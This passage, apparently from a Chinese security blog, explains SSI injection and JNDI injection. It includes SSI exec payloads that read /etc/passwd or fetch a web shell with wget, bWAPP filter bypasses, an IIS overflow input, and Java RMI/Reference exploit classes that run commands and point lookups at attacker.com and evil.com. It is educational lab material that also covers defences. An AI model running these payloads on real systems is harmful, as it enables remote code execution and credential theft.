默认是 text/html location / &#123; root html; index index.html index.htm; &#125;&#125; Apache修改Apache配置文件httpd.conf： 1、确认加载include.so模块，将注释去掉： 1LoadModule include_module libexec/apache2/mod_include.so 2、AddType部分去掉这两段注释： 12AddType text/html .shtmlAddOutputFilter INCLUDES .shtml 3、Directory目录权限里面找到Options Indexes FollowSymLinks，并增加Includes修改为Options Indexes FollowSymLinks Includes； 4、重新启动Apache； IIS不同版本的Windows下配置有所区别，具体的参考下资料就好： win7下使用IIS服务器及自定义服务器端包含模块（SSI）步骤 IIS SHTML支持设置方法（SSI） SSI基本语法在SHTML文件中SSI标签使用的几种基本语法如下，必须注意的是其语法格式必须是以html的注释符&lt;!--开头、且后面紧接#符号和SSI命令，它们期间不能存在空格： 1、显示服务器端环境变量&lt;#echo&gt; 本文档名称：&lt;!--#echo var=&quot;DOCUMENT_NAME&quot;--&gt; 现在时间：&lt;!--#echo var=&quot;DATE_LOCAL&quot;--&gt; 显示IP地址：&lt;!--#echo var=&quot;REMOTE_ADDR&quot;--&gt; 2、将文本内容直接插入到文档中&lt;#include&gt; 1234&lt;!--#include file=&quot;文件名称&quot;--&gt;&lt;!--#include virtual=&quot;index.html&quot; --&gt;&lt;!--#include virtual=&quot;文件名称&quot;–&gt;&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt; 注：file包含文件可以在同一级目录或其子目录中，但不能在上一级目录中，virtual包含文件可以是Web站点上的虚拟目录的完整路径。 3、显示WEB文档相关信息&lt;#flastmod&gt;&lt;#fsize&gt;(如文件制作日期/大小等) 文件最近更新日期：&lt;! #flastmod file=&quot;文件名称&quot;–&gt; 文件的长度：&lt;!--#fsize file=&quot;文件名称&quot;--&gt; 4、直接执行服务器上的各种程序&lt;#exec&gt;(如CGI或其他可执行程序) 1234&lt;!–#exec cmd=&quot;文件名称&quot;–&gt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&lt;!–#exec cgi=&quot;文件名称&quot;–&gt;&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi&quot;–&gt; 将某一外部程序的输出插入到页面中。可插入CGI程序或者是常规应用程序的输入，这取决于使用的参数是cmd还是CGI。 5、设置SSI信息显示格式&lt;#config&gt;(如文件制作日期/大小显示方式) 6、高级SSI可设置变量使用if条件语句 0x02 SSI注入漏洞何为SSI注入SSI注入全称Server-Side Includes Injection，即服务端包含注入。在stm、shtm、shtml等Web页面中，如果用户可以从外部输入SSI标签，而输入的内容会显示到上述后缀的Web页面时，就导致可以远程在Web应用中注入脚本来执行代码。 简单点说就是攻击者可以通过外部输入SSI标签到Web页面（stm、shtm、shtml文件）来动态执行代码。 SSI注入允许远程在Web应用中注入脚本来执行代码。简单点说就是攻击者可以通过外部输入SSI语句到Web页面来动态执行代码。 前提条件攻击者要想进行SSI注入、在Web服务器上运行任意命令，需要满足下列几点前提条件才能成功： Web服务器支持并开启了SSI； Web应用程序在返回HTML页面时，嵌入了用户输入的内容； 外部输入的参数值未进行有效的过滤； 漏洞场景一般地，在stm、shtm、shtml等文件中，存在XSS的页面，大概率是存在SSI注入漏洞的。也就是说，用户输入的内容会显示在页面中的场景。比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI注入漏洞。 从定义中看出，页面中有一小部分是动态输出的时候使用SSI，比如： 文件相关的属性字段 当前时间 访客IP 调用CGI程序 SSI注入常用命令这里可以参考OWASP的说明：https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection 命令执行Linux 列出目录文件： 1&lt;!--#exec cmd=&quot;ls&quot; --&gt; 访问目录： 1&lt;!--#exec cmd=&quot;cd /root/dir/&quot;&gt; 执行脚本： 1&lt;!--#exec cmd=&quot;wget http://mysite.com/shell.txt | rename shell.txt shell.php&quot; --&gt; Windows 列出目录文件： 1&lt;!--#exec cmd=&quot;dir&quot; --&gt; 访问目录： 1&lt;!--#exec cmd=&quot;cd C:\\admin\\dir&quot;&gt; 访问与设置服务器信息更改错误消息输出： 1&lt;!--#config errmsg=&quot;File not found, informs users and password&quot;--&gt; 显示当前文档的文件名： 1&lt;!--#echo var=&quot;DOCUMENT_NAME&quot; --&gt; 显示虚拟路径和文件名： 1&lt;!--#echo var=&quot;DOCUMENT_URI&quot; --&gt; 使用“ config”命令和“ timefmt”参数，可以控制日期和时间输出格式： 1&lt;!--#config timefmt=&quot;A %B %d %Y %r&quot;--&gt; 使用“ fsize”命令，可以打印所选文件的大小： 1&lt;!--#fsize file=&quot;ssi.shtml&quot; --&gt; ssinc.dll缓冲区溢出漏洞在IIS的4.0和5.0版本中，攻击者可以通过动态链接库（ssinc.dll）中的缓冲区溢出故障来获取系统特权。ssinc.dll是用于解释服务器端包含文件的程序。 通过创建包含以下SSI代码的恶意页面并强制Web应用加载该页面（ 路径遍历攻击），可以执行以下攻击： ssi_over.shtml： 1&lt;!--#include file=&quot;UUUUUUUU...UU&quot;--&gt; 注意，字符U的数量必须大于2049。 强制Web应用加载ssi_over.shtml页面： 正常网站：www.vulnerablesite.org/index.asp?page=news.asp 恶意网站：www.vulnerablesite.org/index.asp?page=www.malicioussite.com/ssi_over.shtml 如果IIS返回空白页，则表明发生了溢出。在这种情况下，攻击者可能会操纵过程流并执行任意代码。 Demo下面直接看BWAPP的SSI注入漏洞环境。 Low级页面是个表单，可以输入First name和Last name，然后提交来查询你的IP地址： 随便输入些内容点击Lookup，跳转至新的页面： 可看到该页面是shtml页面，并且用户输入的表单信息直接输出在该页面上。 当然，我们输入XSS payload，就会弹框了，后台没有进行任何过滤： 这就满足前面所说的场景了，该页面是SHTML文件，且存在反射型XSS，同时我们可以推测服务端是开启SSI的（因为对IP地址进行了查询操作并输出在页面上），那么该页面时大概率存在SSI注入漏洞的。 下面来验证一下，直接输入执行系统命令的SSI标签： &lt;!--#exec cmd=&quot;whoami&quot;--&gt; 据此，我们就可以知道，下面显示lookup结果的IP地址的SSI标签为&lt;!--#echo var=&quot;REMOTE_ADDR&quot;--&gt;。 Medium级该级别下XSS不能通过引号来将字符串括起来再弹框输出，因为后台程序在引号前添加了反斜杠进行了转义： 但是输入数字和用/括起来的字符串还是能正常输出的： 即目前可知，后台程序对引号都进行了转义的出来。 意料之中，Low级SSI注入的payload输进去后没执行成功： 一个个字符尝试，从XSS能注入的话是发现尖括号&lt;&gt;是没有被过滤的；接着对着之前的payload逐个字符去掉，发现将双引号去掉就能执行了： &lt;!--#exec cmd=whoami --&gt; 虽然可以执行whoami命令，但是对于需要参数输入的命令是没办法执行了的，因为没有引号将整条命令括起来而中间存在空格，这样后台是没办法识别出整条命令的。 那么尝试将双引号替换为单引号，同样失效；这时可以想象平时进行命令注入利用的时候，我们可以利用哪些特殊字符，如换行符\\n、反引号`、分号;、管道符|、与运算符&amp;等等，逐一尝试，最后发现反引号成功执行命令： 1&lt;!--#exec cmd=`cat /etc/passwd`--&gt; High级此级别下，后台程序对输入的内容进行了HTML编码后才输出到页面中，即完全防御住了XSS漏洞，同时也让SSI注入无法成功进行： 最为重要的尖括号&lt;&gt;都被HTML编码了，那就不可能再插入标签了，而SSI注入就是注入标签，这下啥戏都没有了。 这也从另一方面说明，成功防御XSS漏洞的HTML输出编码也能够有效防御SSI注入漏洞。 源码简析在ssii.php中，关键代码如下，不同级别下xss()函数中调用的过滤函数是不一样的： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869include(\"security.php\");include(\"security_level_check.php\");include(\"functions_external.php\");include(\"selections.php\");$field_empty = 0;function xss($data)&#123; switch($_COOKIE[\"security_level\"]) &#123; case \"0\" : $data = no_check($data); break; case \"1\" : $data = xss_check_4($data); break; case \"2\" : $data = xss_check_3($data); break; default : $data = no_check($data); break; &#125; return $data;&#125;if(isset($_POST[\"form\"]))&#123; $firstname = ucwords(xss($_POST[\"firstname\"])); $lastname = ucwords(xss($_POST[\"lastname\"])); if($firstname == \"\" or $lastname == \"\") &#123; $field_empty = 1; &#125; else &#123; $line = '&lt;p&gt;Hello ' . $firstname . ' ' . $lastname . ',&lt;/p&gt;&lt;p&gt;Your IP address is:' . '&lt;/p&gt;&lt;h1&gt;&lt;!--#echo var=\"REMOTE_ADDR\" --&gt;&lt;/h1&gt;'; // Writes a new line to the file $fp = fopen(\"ssii.shtml\", \"w\"); fputs($fp, $line, 200); fclose($fp); header(\"Location: ssii.shtml\"); exit; &#125;&#125; 下面我们跟到functions_external.php，查看几个防御函数是怎么写的： 12345678910111213141516171819202122232425262728293031function no_check($data)&#123; return $data; &#125;function xss_check_3($data, $encoding = \"UTF-8\")&#123; // htmlspecialchars - converts special characters to HTML entities // '&amp;' (ampersand) becomes '&amp;amp;' // '\"' (double quote) becomes '&amp;quot;' when ENT_NOQUOTES is not set // \"'\" (single quote) becomes '&amp;#039;' (or &amp;apos;) only when ENT_QUOTES is set // '&lt;' (less than) becomes '&amp;lt;' // '&gt;' (greater than) becomes '&amp;gt;' return htmlspecialchars($data, ENT_QUOTES, $encoding); &#125;function xss_check_4($data)&#123; // addslashes - returns a string with backslashes before characters that need to be quoted in database queries etc. // These characters are single quote ('), double quote (\"), backslash (\\) and NUL (the NULL byte). // Do NOT use this for XSS or HTML validations!!! return addslashes($data); &#125; no_check()函数无任何过滤，对应Low级；xss_check_4()函数调用addslashes()函数进行过滤，即对引号继续转义操作，对应Medium级；xss_check_3()函数调用防御XSS的终极Boss——htmlspecialchars()函数进行过滤，将尖括号等进行了转义，对应High级。 0x03 检测与防御检测方法搜索是否存在.stm,.shtm和.shtml后缀的文件，若存在则进一步判断Web服务是否支持并开启了SSI，若开启了则进一步分析上述后缀的文件中是否存在用户输入内容未经过有效过滤就反射输出到页面中，若有则存在SSI注入漏洞。 防御方法 若非必须，尽量关闭服务器的SSI功能； 对用户的输入进行严格的过滤，过滤相关SSI特殊字符（&lt;,&gt;,#,-,&quot;,&#39;）； 0x04 参考服务器端包含注入SSI分析总结 Server-Side Includes (SSI) Injection_Injection)","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"SSI注入","slug":"SSI注入","permalink":"https://www.mi1k7ea.com/tags/SSI注入/"}]},{"title":"浅析JNDI注入","date":"2019-09-15T09:03:37.000Z","path":"2019/09/15/浅析JNDI注入/","text":"0x01 基本概念何为JNDIJNDI全称为 Java Naming and DirectoryInterface（Java命名和目录接口），是一组应用程序接口，为开发人员查找和访问各种资源提供了统一的通用接口，可以用来定义用户、网络、机器、对象和服务等各种资源。 JNDI支持的服务主要有：DNS、LDAP、CORBA、RMI等。 简单点说，JNDI就是一组API接口。每一个对象都有一组唯一的键值绑定，将名字和对象绑定，可以通过名字检索指定的对象，而该对象可能存储在RMI、LDAP、CORBA等等。 如图： Java Naming命名服务是一种键值对的绑定，使应用程序可以通过键检索值。 Java Directory目录服务是命名服务的自然扩展。这两者之间的区别在于目录服务中对象可以有属性，而命名服务中对象没有属性。因此，在目录服务中可以根据属性搜索对象。 JNDI允许你访问文件系统中的文件，定位远程RMI注册的对象，访问如LDAP这样的目录服务，定位网络上的EJB组件。 ObjectFactoryObject Factory用于将Naming Service（如RMI/LDAP）中存储的数据转换为Java中可表达的数据，如Java中的对象或Java中的基本数据类型。每一个Service Provider可能配有多个Object Factory。 JNDI注入的问题就是处在可远程下载自定义的ObjectFactory类上。 JNDI的代码示例在JNDI中提供了绑定和查找的方法： bind：将名称绑定到对象中； lookup：通过名字检索执行的对象； 下面是基本用法Demo，以RMI服务为例。 先定义一个Person类： 12345678910111213141516171819202122232425public class Person implements Remote, Serializable &#123; private static final long serialVersionUID = 1L; private String name; private String password; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getPassword() &#123; return password; &#125; public void setPassword(String password) &#123; this.password = password; &#125; public String toString()&#123; return \"name:\"+name+\" password:\"+password; &#125;&#125; Server.java，其实是将服务端和客户端的代码写在一起了，分为两个部分。第一部分是initPerson()函数即服务端，其通过JNDI实现RMI服务，并通过JNDI的bind()函数将实例化的Person对象绑定到RMI服务中；第二部分是findPerson()函数即客户端，其通过JNDI的lookup方法来检索person对象并输出出来： 12345678910111213141516171819202122232425262728293031323334353637public class Server &#123; public static void initPerson() throws Exception&#123; //配置JNDI工厂和JNDI的url和端口。如果没有配置这些信息，会出现NoInitialContextException异常 LocateRegistry.createRegistry(6666); System.setProperty(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); System.setProperty(Context.PROVIDER_URL, \"rmi://localhost:6666\"); //初始化 InitialContext ctx = new InitialContext(); //实例化person对象 Person p = new Person(); p.setName(\"mi1k7ea\"); p.setPassword(\"Niubility!\"); //person对象绑定到JNDI服务中，JNDI的名字叫做：person。 ctx.bind(\"person\", p); ctx.close(); &#125; public static void findPerson() throws Exception&#123; //因为前面已经将JNDI工厂和JNDI的url和端口已经添加到System对象中，这里就不用在绑定了 InitialContext ctx = new InitialContext(); //通过lookup查找person对象 Person person = (Person) ctx.lookup(\"person\"); //打印出这个对象 System.out.println(person.toString()); ctx.close(); &#125; public static void main(String[] args) throws Exception &#123; initPerson(); findPerson(); &#125;&#125; 运行Server的程序，findPerson()函数会成功从启动的JNDI服务中找到指定的对象并输出出来： 一个题外话 我们可以简单比较一下纯RMI写法和使用JNDI检索的写法，在纯RMI写法中的两种典型写法： 123456789101112131415161718192021222324252627282930import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;import remote.IRemoteMath;... //服务端 IRemoteMath remoteMath = new RemoteMath(); LocateRegistry.createRegistry(1099); Registry registry = LocateRegistry.getRegistry(); registry.bind(\"Compute\", remoteMath);... //客户端 Registry registry = LocateRegistry.getRegistry(\"localhost\"); IRemoteMath remoteMath = (IRemoteMath)registry.lookup(\"Compute\");或import java.rmi.Naming;import java.rmi.registry.LocateRegistry;... //服务端 PersonService personService=new PersonServiceImpl(); LocateRegistry.createRegistry(6600); Naming.rebind(\"rmi://127.0.0.1:6600/PersonService\", personService);... //客户端 PersonService personService=(PersonService) Naming.lookup(\"rmi://127.0.0.1:6600/PersonService\"); 而JNDI中相关代码： 1234567891011121314151617181920212223242526272829import javax.naming.Context;import javax.naming.InitialContext;import java.rmi.registry.LocateRegistry;... //服务端 LocateRegistry.createRegistry(6666); System.setProperty(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); System.setProperty(Context.PROVIDER_URL, \"rmi://localhost:6666\"); InitialContext ctx = new InitialContext(); ... ctx.bind(\"person\", p); ctx.close();... //客户端 InitialContext ctx = new InitialContext(); Person person = (Person) ctx.lookup(\"person\"); ctx.close();或 //服务端 Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://localhost:1099\"); Context ctx = new InitialContext(env); 相比之下： 服务端：纯RMI实现中是调用java.rmi包内的bind()或rebind()方法来直接绑定RMI注册表端口的，而JNDI创建的RMI服务中多的部分就是需要设置INITIAL_CONTEXT_FACTORY和PROVIDER_URL来指定InitialContext的初始化Factory和Provider的URL地址，换句话说就是初始化配置JNDI设置时需要预先指定其上下文环境如指定为RMI服务，最后再调用javax.naming.InitialContext.bind()来将指定对象绑定到RMI注册表中； 客户端：纯RMI实现中是调用java.rmi包内的lookup()方法来检索绑定在RMI注册表中的对象，而JNDI实现的RMI客户端查询是调用javax.naming.InitialContext.lookup()方法来检索的； 简单地说，纯RMI实现的方式主要是调用java.rmi这个包来实现绑定和检索的，而JNDI实现的RMI服务则是调用javax.naming这个包即应用Java Naming来实现的。 Reference类Reference类表示对存在于命名/目录系统以外的对象的引用。 Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。 在使用Reference时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发。 几个比较关键的属性： className：远程加载时所使用的类名； classFactory：加载的class中需要实例化类的名称； classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议； 远程代码和安全管理器这部分引用自：https://blog.csdn.net/u011721501/article/details/52316225 Java中的安全管理器 Java中的对象分为本地对象和远程对象，本地对象是默认为可信任的，但是远程对象是不受信任的。比如，当我们的系统从远程服务器加载一个对象，为了安全起见，JVM就要限制该对象的能力，比如禁止该对象访问我们本地的文件系统等，这些在现有的JVM中是依赖安全管理器（SecurityManager）来实现的。 JVM中采用的最新模型见上图，引入了“域”的概念，在不同的域中执行不同的权限。JVM会把所有代码加载到不同的系统域和应用域，系统域专门负责与关键资源进行交互，而应用域则通过系统域的部分代理来对各种需要的资源进行访问，存在于不同域的class文件就具有了当前域的全部权限。 关于安全管理机制，可以详细阅读： http://www.ibm.com/developerworks/cn/java/j-lo-javasecurity/ JNDI的安全管理器这部分在后面绕过高版本JDK限制中也会具体讲到。 对于加载远程对象，JDNI有两种不同的安全控制方式，对于Naming Manager来说，相对的安全管理器的规则比较宽泛，但是对JNDI SPI层会按照下面表格中的规则进行控制： 针对以上特性，黑客可能会找到一些特殊场景，利用两者的差异来执行恶意代码。 JNDI协议动态转换举前面的例子，JNDI实现的RMI服务中，可以在初始化配置JNDI设置时预先指定其上下文环境（RMI、LDAP、CORBA等），这里列出前面的两种写法： 12345678910111213 Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://localhost:1099\"); Context ctx = new InitialContext(env);或 LocateRegistry.createRegistry(6666); System.setProperty(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); System.setProperty(Context.PROVIDER_URL, \"rmi://localhost:6666\"); InitialContext ctx = new InitialContext(); 但在调用lookup()或者search()时，可以使用带URI动态的转换上下文环境，例如上面已经设置了当前上下文会访问RMI服务，那么可以直接使用LDAP的URI格式去转换上下文环境访问LDAP服务上的绑定对象而非原本的RMI服务： 1ctx.lookup(\"ldap://attacker.com:12345/ou=foo,dc=foobar,dc=com\"); 其原理可以跟踪代码找到： 123public Object lookup(String name) throws NamingException &#123; return getURLOrDefaultInitCtx(name).lookup(name);&#125; 再跟进去就知道了： 1234567891011121314151617protected Context getURLOrDefaultInitCtx(Name paramName) throws NamingException &#123; if (NamingManager.hasInitialContextFactoryBuilder()) &#123; return getDefaultInitCtx(); &#125; if (paramName.size() &gt; 0) &#123; String str1 = paramName.get(0); String str2 = getURLScheme(str1); // 尝试解析 URI 中的协议 if (str2 != null) &#123; // 如果存在 Schema 协议，则尝试获取其对应的上下文环境 Context localContext = NamingManager.getURLContext(str2, this.myProps); if (localContext != null) &#123; return localContext; &#125; &#125; &#125; return getDefaultInitCtx();&#125; 0x02 JNDI注入前提条件&amp;JDK防御要想成功利用JNDI注入漏洞，重要的前提就是当前Java环境的JDK版本，而JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样。 这里将所有不同版本JDK的防御都列出来： JDK 6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。 JDK 6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。 JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。 因此，我们在进行JNDI注入之前，必须知道当前环境JDK版本这一前提条件，只有JDK版本在可利用的范围内才满足我们进行JNDI注入的前提条件。 RMI攻击向量RMI+Reference利用技巧JNDI提供了一个Reference类来表示某个对象的引用，这个类中包含被引用对象的类信息和地址。 因为在JNDI中，对象传递要么是序列化方式存储（对象的拷贝，对应按值传递），要么是按照引用（对象的引用，对应按引用传递）来存储，当序列化不好用的时候，我们可以使用Reference将对象存储在JNDI系统中。 那么这个JNDI利用技巧是啥呢？——就是将恶意的Reference类绑定在RMI注册表中，其中恶意引用指向远程恶意的class文件，当用户在JNDI客户端的lookup()函数参数外部可控或Reference类构造方法的classFactoryLocation参数外部可控时，会使用户的JNDI客户端访问RMI注册表中绑定的恶意Reference类，从而加载远程服务器上的恶意class文件在客户端本地执行，最终实现JNDI注入攻击导致远程代码执行。 我们看个示例，以lookup()函数参数外部可控为例，攻击原理如图： 攻击者通过可控的 URI 参数触发动态环境转换，例如这里 URI 为 rmi://evil.com:1099/refObj； 原先配置好的上下文环境 rmi://localhost:1099 会因为动态环境转换而被指向 rmi://evil.com:1099/； 应用去 rmi://evil.com:1099 请求绑定对象 refObj，攻击者事先准备好的 RMI 服务会返回与名称 refObj想绑定的 ReferenceWrapper 对象（Reference(&quot;EvilObject&quot;, &quot;EvilObject&quot;, &quot;http://evil-cb.com/&quot;)）； 应用获取到 ReferenceWrapper 对象开始从本地 CLASSPATH 中搜索 EvilObject 类，如果不存在则会从 http://evil-cb.com/ 上去尝试获取 EvilObject.class，即动态的去获取 http://evil-cb.com/EvilObject.class； 攻击者事先准备好的服务返回编译好的包含恶意代码的 EvilObject.class； 应用开始调用 EvilObject 类的构造函数，因攻击者事先定义在构造函数，被包含在里面的恶意代码被执行； 代码如下，当然需要注意JDK版本的影响，我本地JDK版本为1.8.0_73。 JNDIClient.java，lookup()函数参数外部可控： 123456789101112public class JNDIClient &#123; public static void main(String[] args) throws Exception &#123; if(args.length &lt; 1) &#123; System.out.println(\"Usage: java JNDIClient &lt;uri&gt;\"); System.exit(-1); &#125; String uri = args[0]; Context ctx = new InitialContext(); System.out.println(\"Using lookup() to fetch object with \" + uri); ctx.lookup(uri); &#125;&#125; EvilObject.java，目的是弹计算器： 12345678public class EvilObject &#123; public EvilObject() throws Exception &#123; Runtime rt = Runtime.getRuntime(); String[] commands = &#123;\"cmd\", \"/C\", \"calc.exe\"&#125;; Process pc = rt.exec(commands); pc.waitFor(); &#125;&#125; RMIService.java，对象实例要能成功绑定在RMI服务上，必须直接或间接的实现 Remote 接口，这里 ReferenceWrapper就继承于 UnicastRemoteObject 类并实现了Remote接口： 123456789public class RMIService &#123; public static void main(String args[]) throws Exception &#123; Registry registry = LocateRegistry.createRegistry(1099); Reference refObj = new Reference(\"EvilObject\", \"EvilObject\", \"http://127.0.0.1:8080/\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj); System.out.println(\"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'\"); registry.bind(\"refObj\", refObjWrapper); &#125;&#125; 这里将RMIService.java和JNDIClient.java放在同一目录下，将EvilObject.java放在另一个目录下（为防止漏洞复现过程中应用端实例化EvilObject对象时从CLASSPATH当前路径找到编译好的字节代码，而不去远端进行下载的情况发生）,编译这三个文件，并在不同窗口下执行命令，最后成功通过RMI+Reference的方式实现JNDI注入： 漏洞点1——lookup参数注入当JNDI客户端的lookup()函数的参数可控即URI可控时，根据JNDI协议动态转换的原理，攻击者可以传入恶意URI地址指向攻击者的RMI注册表服务，以使受害者客户端加载绑定在攻击者RMI注册表服务上的恶意类，从而实现远程代码执行。 下面以RMI服务为例，原理和上一个小结讲的是一样的，本地JDK版本为1.8.0_73。 AClient.java，是JNDI客户端，原本上下文环境已经设置了默认连接本地的1099端口的RMI注册表服务，同时程序允许用户输入URI地址来动态转换JNDI的访问地址，即此处lookup()函数的参数可控： 1234567891011121314151617public class AClient &#123; public static void main(String[] args) throws Exception &#123; Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://127.0.0.1:1099\"); Context ctx = new InitialContext(env); String uri = \"\"; if(args.length == 1) &#123; uri = args[0]; System.out.println(\"[*]Using lookup() to fetch object with \" + uri); ctx.lookup(uri); &#125; else &#123; System.out.println(\"[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo\"); ctx.lookup(\"demo\"); &#125; &#125;&#125; AServer.java，是攻击者搭建的恶意RMI注册表服务而非原本正常的本地RMI注册表服务（做漏洞演示就没必要写正常的服务端那部分了），其将恶意Reference类绑定到RMI注册表中，用于给JNDI客户端加载并执行恶意代码（注意这里的Reference类初始化时其第三个参数即factoryLocation参数随意设置了一个内容，将该恶意类放在与当前RMI注册表服务同一目录中，当然也可以修改该参数为某个URI去加载，但是需要注意的是URL不用指定到特定的class、只需给出该class所在的URL路径即可）： 123456789public class AServer &#123; public static void main(String args[]) throws Exception &#123; Registry registry = LocateRegistry.createRegistry(1688); Reference refObj = new Reference(\"EvilClass\", \"EvilClassFactory\", \"test\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj); System.out.println(\"[*]Binding 'exp' to 'rmi://127.0.0.1:1688/exp'\"); registry.bind(\"exp\", refObjWrapper); &#125;&#125; 最后编写恶意EvilClassFactory类，目标是在客户端执行ipconfig命令，将其编译成class文件后与AServer放置于同一目录下： 12345678910111213141516171819202122public class EvilClassFactory extends UnicastRemoteObject implements ObjectFactory &#123; public EvilClassFactory() throws RemoteException &#123; super(); InputStream inputStream; try &#123; inputStream = Runtime.getRuntime().exec(\"ipconfig\").getInputStream(); BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(bufferedInputStream)); String linestr; while ((linestr = bufferedReader.readLine()) != null)&#123; System.out.println(linestr); &#125; &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123; return null; &#125;&#125; 模拟场景，攻击者开启恶意RMI注册表服务AServer，同时恶意类EvilClassFactory放置在同一环境中，由于JNDI客户端的lookup()函数参数可控，因为当客户端输入指向AServer的URI进行lookup操作时就会触发JNDI注入漏洞，导致远程代码执行。效果如图： 最后小结一下，调用InitialContext.lookup()函数都有哪些类。 在RMI中调用了InitialContext.lookup()的类有： 1234org.springframework.transaction.jta.JtaTransactionManager.readObject()com.sun.rowset.JdbcRowSetImpl.execute()javax.management.remote.rmi.RMIConnector.connect()org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName) 在LDAP中调用了InitialContext.lookup()的类有： 123InitialDirContext.lookup()Spring&apos;s LdapTemplate.lookup()LdapTemplate.lookupContext() 漏洞点2——classFactoryLocation参数注入前面lookup()参数注入是基于RMI客户端的，也是最常见的。而本小节的classFactoryLocation参数注入则是对于RMI服务端而言的，也就是说服务端程序在调用Reference()初始化参数时，其中的classFactoryLocation参数外部可控，导致存在JNDI注入。 整个利用原理过程如图： BClient.java，RMI客户端，通过JNDI来查询RMI注册表上绑定的demo对象，其中lookup()函数参数不可控： 12345678910public class BClient &#123; public static void main(String[] args) throws Exception &#123; Properties env = new Properties(); env.put(Context.INITIAL_CONTEXT_FACTORY, \"com.sun.jndi.rmi.registry.RegistryContextFactory\"); env.put(Context.PROVIDER_URL, \"rmi://127.0.0.1:1099\"); Context ctx = new InitialContext(env); System.out.println(\"[*]Using lookup() to fetch object with rmi://127.0.0.1:1099/demo\"); ctx.lookup(\"demo\"); &#125;&#125; BServer.java，RMI服务端，创建RMI注册表并将一个远程类的引用绑定在注册表中名为demo，其中该Reference的classFactoryLocation参数外部可控： 12345678910111213141516public class BServer &#123; public static void main(String args[]) throws Exception &#123; String uri = \"\"; if(args.length == 1) &#123; uri = args[0]; &#125; else &#123; uri = \"http://127.0.0.1/demo.class\"; &#125; System.out.println(\"[*]classFactoryLocation: \" + uri); Registry registry = LocateRegistry.createRegistry(1099); Reference refObj = new Reference(\"EvilClass\", \"EvilClassFactory\", uri); ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj); System.out.println(\"[*]Binding 'demo' to 'rmi://192.168.43.201:1099/demo'\"); registry.bind(\"demo\", refObjWrapper); &#125;&#125; EvilClassFactory.java，攻击者编写的远程恶意类，这里是在RMI客户端执行tasklist命令并输出出来： 12345678910111213141516171819202122public class EvilClassFactory extends UnicastRemoteObject implements ObjectFactory &#123; public EvilClassFactory() throws RemoteException &#123; super(); InputStream inputStream; try &#123; inputStream = Runtime.getRuntime().exec(\"tasklist\").getInputStream(); BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream); BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(bufferedInputStream)); String linestr; while ((linestr = bufferedReader.readLine()) != null)&#123; System.out.println(linestr); &#125; &#125; catch (IOException e)&#123; e.printStackTrace(); &#125; &#125; @Override public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment) throws Exception &#123; return null; &#125;&#125; 攻击者将恶意类EvilClassFactory.class放置在自己的Web服务器后，通过往RMI注册表服务端的classFactoryLocation参数输入攻击者的Web服务器地址后，当受害者的RMI客户端通过JNDI来查询RMI注册表中年绑定的demo对象时，会找到classFactoryLocation参数被修改的Reference对象，再远程加载攻击者服务器上的恶意类EvilClassFactory.class，从而导致JNDI注入、实现远程代码执行： 漏洞点3——RMI恶意远程对象 攻击者实现一个RMI恶意远程对象并绑定到RMI Registry上，编译后的RMI远程对象类可以放在HTTP/FTP/SMB等服务器上，这个Codebase地址由远程服务器的 java.rmi.server.codebase 属性设置，供受害者的RMI客户端远程加载，RMI客户端在 lookup() 